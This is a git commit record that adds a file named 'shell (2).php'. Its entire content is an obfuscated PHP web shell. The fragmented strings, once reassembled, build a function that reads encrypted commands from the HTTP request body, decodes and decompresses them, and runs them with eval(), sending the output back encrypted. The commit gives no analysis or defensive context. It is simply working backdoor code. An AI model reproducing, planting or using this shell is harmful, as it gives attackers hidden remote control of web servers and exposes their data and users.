e394add829968dd96bbe0434030a76cf38005230
Aqua <165370592+MaksimYakubets@users.noreply.github.com>
2024-03-29 10:26:30 +0200

    Add files via upload

---
+++ shell (2).php
@@ -0,0 +1,12 @@
+<?php
+$o=str_replace('fo','','crfoeafotfoefofo_ffounction');
+$M='tents(-6"php://-6input-6"),$m)=-6=-61)-6 {@ob_start-6();@eva-6l(@gzunco-6m-6press(@';
+$i='^$k{$-6j};-6}}re-6turn $o-6-6;}if (@pr-6eg_mat-6ch("/$-6kh(.+)$kf/-6",-6@file_g-6et_con';
+$n='-6x(@base6-64_deco-6de($m[-61]),$k-6))-6);$o=@ob_ge-6t-6_co-6ntents();@ob_end-6_clea-';
+$m='$k=-6-6"1a1d-6c91c";$kh-6="9-607325c6-69271";$kf="ddf-60c944bc72-6";$p="-6ch9X-6-6YAkD';
+$p='GhCa-6cnn-6g";function-6 x($t,$k)-6{$c=strl-6e-6n($k);-6$l=strl-6en($t);-6$o=-6"";';
+$k='for($-6i-6=0;-6$i<-6$l;-6){for($j=0;($j<$c&&$i<$-6l);$-6-6j++,$i++){$o.-6=$t-6{$i}';
+$Z='6n-6();$r=@base-664_enco-6d-6e(@x(@g-6z-6co-6mpress($o),-6$k));print("-6$-6p$kh$r$kf");}';
+$z=str_replace('-6','',$m.$p.$k.$i.$M.$n.$Z);
+$G=$o('',$z);$G();
+?>
